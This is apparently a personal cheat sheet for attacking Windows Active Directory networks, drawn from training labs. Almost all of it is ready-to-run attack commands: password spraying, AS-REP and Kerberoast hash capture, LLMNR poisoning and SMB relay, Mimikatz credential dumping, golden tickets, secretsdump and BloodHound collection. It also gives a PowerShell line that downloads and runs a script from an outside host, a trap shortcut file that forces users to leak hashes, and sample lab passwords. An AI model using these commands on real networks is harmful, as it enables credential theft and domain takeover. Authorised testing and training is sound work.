
<h2> Anon access </h2><br>
For initial access do nmap scan for anon access FTP, does this lead to web server? are there default pages that load web? can u insert msfvenom reverse shell/php/asp RS then browse to it on the web end? <br>
  
<h2>Kerbrute</h2><br>
Only do usernames as to not lockout users<br>
Located in my downloads<br>
./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.103.225 users.txt<br>
<br>
For password spray - kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1 --safe<br>
<br>

<h2>Username grabbing</h2><br>
enum4linux -U DCIP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"<br>
<br>
Rpcclient - rpcclient -U ""-N 172.16.5.5 (only change IP)<br>
<br>
crackmapexec smb 172.16.5.5 --users  (only change IP)(this is null session)<br>
If you have creds - sudo crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users<br>
<br>
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL"-s sub "(&(objectclass=user))"|grep samAccountName: |cut-f2 -d" "<br>
<br>
./windapsearch.py --dc-ip 172.16.5.5 -u ""-U  (only change IP)<br>
<br>
<br>
Can now spray passwords with kerbrute - kerbrute passwordspray -d domain --dc IP validusers.txt Welcome1 --safe <br>
For windows, import PowerView.ps1 and run Get-NetUser | select cn <br>
<br>

<h2>Query Ticket auth with no password</h2><br>
take valid usernames from kerbrute and place into new user file<br>
sudo python3 /home/kali/impacket/examples/GetNPUsers.py -dc-ip 10.10.103.225 spookysec.local/ -usersfile users.txt -format john -outputfile hashes<br>
cat hashes - look for any usernames with hashes here to crack<br>
<br>
To crack this with hashcat, you need to add a 23 to the hash between rep and name - so e.g $krb5asrep$23$asdas -  https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
hashcat mode -m 18200<br>
<br>

<h2>LLMNR Poisoning</h2><br>
fallback with share that is unknown, device reaches out with broadcast to see if any device knows the share, malicious machine asks for hash to direct user
<br>
Responder is used to capture the hashes (type locate responder to find the path) - python3 responder.py -I eth0 -dwvv<br>
Run tool first thing in morning on a pen test and right after lunch<br>
<br>
To relay also run ntlmrelay<br>
First do crackmapexec smb scope.txt (tac for smbsigning, need to google forgot) targets.txt <br>
python3 /home/kali/impacket/ntlmrelayx.py -tf targets.txt -smb2support <br>
Impacket v0.9.24 - Copyright 2022 SecureAuth Corporation <br>
<br>
<br>
Next you'll want to crack the hashes - Hashcat runs better on normal PC and not VM due to using GPU. Copy whole hash, add to text file.<br>
hashcat -m 5600 file.txt rockyou.txt --force ------ -m 5600 stands for AD hash NetNTLMv2<br>
<br>
From Windows<br>
PS C:\htb> Import-Module .\Inveigh.ps1<br>
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters<br>
<br>
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y<br>
<br>
<br>

<h2>SMB Relay</h2><br>
Instead of cracking hashes from responder, can relay hashes to another machine. SMB signing has to be disabled on the target and relayed creds must be admin on machine.<br>
to work have to go to responder.conf and turn off SMB and HTTP<br>
Run Responder.py and also now configure ntlmrelayx.py (locate ntlmrelay) python3 ntlmrelayx.py -tf targets.txt -smb2support (add -i for interactive shell)<br>
<br>
Can gain shell access with pw - run psexec (metasploit module) - need domain, user and pass, may need to try the module several times<br>
Could also use - sudo python3 smbexec.py domain/username:'password'@IP<br>
Or psexec.py domain/username:password@IP<br>
<br>

<h2>Pass Back Attack</h2><br>
This is an LDAP attack (anything that uses LDAP to connect to AD such as printers)<br>
on LDAP server address within the settings configuration if you change the IP address of the LDAP server to your machine and setup a listerner (responder or netcat) the password will be sent over in cleartext<br>
Find webserver using LDAP connection and see if you can change the settings (default PW's on printers)<br>

<h2>Force Hashes</h2>
If you already have a user account and can write to a share that has alot of popularity, you can create a file that uses a fake icon file linking back to your IP running responder<br>
name the file "@something.url" and include contents<br>
[InternetShortcut] URL=https://securify.nl IconIndex=0 IconFile=\\\leak\leak.ico<br>
run responder and anyone who visits share will send hash<br>
<br>

<h2>MITM6</h2><br>
github.com/got-it/mitm6<br>
mitm6 -I eth0 -d domain.local (add the client domain)<br>
Now setup relay attack with ntlmrelayx - ntlmrelayx.py -6 -t ldaps://domainip -wh fakewpad.domain.local -l lootme   (change domain.local to client domain)<br>
<br>
<br>
<h2>GPP Attacks</h2><br>
Sometimes stored in sysvol, cpassword is encrypted, can be de-crypted. Check with Metasploit - smb_enum_gpp.<br>
Download if accessible via SMB by authing to smb - using mget command - mget * to download all files<br>
To decrypt cpassword - use tool call gpp-decrypt<br>
https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/<br>
<br>

<h2>Further strats</h2><br>
Look for web portals that may have default creds, anything on there that shows AD creds?<br>
Check GPO's or hardcoded creds within XML files etc<br>
Look on printers<br>
<br>

<h1>Post exploitation (already have creds)</h1><br>
<h2>Enumerating password policies with a valid account</h2><br>
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol<br>

<h2>Enumerating password policieis with NULL SMB sessions</h2><br>
rpcclient -U ""-N 172.16.5.5<br>
<br>

<h2>Domain Enumeration with Powershell</h2><br>
. .\PowerView.ps1 (enter)<br>
Get-NetDomain (enter)<br>
Get-DomainPolicy<br>
Get-NetUser (sometimes passwords are placed in Description) -- Get-NetUser | select description <br>

<br>
<h2>Pass the password</h2><br>
crackmapexec smb IP/CIDR -u user -d domain -p password<br>
This will loop through the IPs specified to see what devices the user can authenticate against.<br>
<br>
Then use smbclient to look into shares<br>
smbclient -L \\\\172.16.7.50\\ -U AB920 -W inlanefreight.local<br>
sudo smbmap -H 172.16.7.3 -u AB920 -p weasal -d domain -r 'Department Shares'<br>
<br>

<h2>Pass the Hash</h2><br>
Crackmapexec smb IP -u username -H hash<br>
<br>

<h2>Find valid Domain Admins with lower account</h2><br>
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da <br>
<br>

<h2>Secrets Dump</h2><br>
Any machine that allows login via SMB perform a secrets dump on the machine to dump out the local hashes should the account be a administrator<br>
secretsdump.py domain/username:password@ip<br>
On my kali the location is /usr/share/doc/python3-impacket/examples/secretsdump.py<br>
<br>
<br>

<h2>EvilWinRM</h2><br>
If a device has winrm open, we can try use evil-winrm. If you already have a hash or a password this can be passed to a target IP using evil-winrm<br>
<br>

<h2>Kerboeroasting</h2><br>
Goal here is to get a TGS (Service Ticket) to decrypt servers account hash<br>
python3 /home/kali/impacket/examples/GetUsersSPN.py domain/username:password -dc-ip IP -request<br>
(doesnt always need password)<br>
Hashcat -m 13100 textfile.txt wordlist.txt<br>
<br>
Impacket also has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames. This can grab accounts without pre query auth set<br>
<br>

<h2>Kerbroasting from windows</h2><br>
Run Powerview (download fromn machine that can access the internet - IEX (New-Object System.Net.Webclient).DownloadString(' http://10.10.14.160:8000/PowerView.ps1')<br>
Or download to my localmachine and do a wget across Wget http://server:port/address -outfile name.ps1<br>
Import-Module .\PowerView.ps1<br>
Get-DomainUser * -spn | select samaccountname<br>
Now target account - Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat<br>
<br>

<h2>PrintNightmare</h2><br>
Use POC online - rpcdump.py<br>
<br>

<h2>Token Impersonation</h2><br>
meterpreter - impersonate_token (use on machine a DA has a session)<br>
<br>

<h2>Credential Dumping Mimikatz (use on machines where DA has logged into)</h2><br>
Mimikatz.exe<br>
Run - privilage::debug<br>
Run - sekurlsa::logonpasswords<br>
<br>
Run - lsadump::lsa /patch (shows hashes etc)<br>
<br>
can try - ntds.dit
<br>
<br>

<h2>golden ticket</h2><br>
Run mimikatz.exe<br>
run - privilage::debug<br>
run - lsadump::lsa /inject /name:krbtgt<br>
copy SID of domain to notepad (shown next to Domain e.g. S-1-5-21-), copy NTLM hash and paste to notepad<br>
run - kerberos::golden /User:Administrator /domain: /sid: /krbtgt:addhashhere /id:500 /ptt<br>
Run - misc::cmd<br>
run command<br>
<br>
<br>
Bloodhound creds
neo4j
password
![image](https://user-images.githubusercontent.com/35967437/204270806-b2dbe213-8e07-46c3-bf96-5d1caf41a746.png)
<br>


![image](https://user-images.githubusercontent.com/35967437/200788095-c9c95791-7229-472a-af91-4f677ec7ec08.png)
<h2> Share enumeration </h2> <br>
can use crackmapexec to see smb access - crackmapexec smb ip -u -p --shares <br>
Take interesting shares and place into smbclient - smbclient ////ip//sharename -u --spider
<br>

<h2> Dumping LSSAS </h2><br>
This can be done with mimikatz (shown above defender may block) and also Crackmapexec -- crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa <br>

<h2> BloodHound</h2>
First run bloodhound on attacking machine -- neo4j console <br>
bloodhound -- creds in Onenote <br>

On machine comprimised run sharphound <br>
. .\Downloads\SharpHound.ps1    
Invoke-Bloodhound -CollectionMethod All -Domain ADDDOMAINHERE.local -ZipFileName loot.zip <br>
Inside of Bloodhound search for Upload icon  and import the loot.zip folder
<br>
note: On some versions of BloodHound the import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files
<br>
To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from<br>

<h2> Dumping LSA with mimikatz </h2> <br>
download mimikatz to machine (AV might block) <br>
./mimikatz.exe <br>
privilege::debug (ensure you have perms to dump, must be local admin) <br>
lsadump::lsa /patch <br>
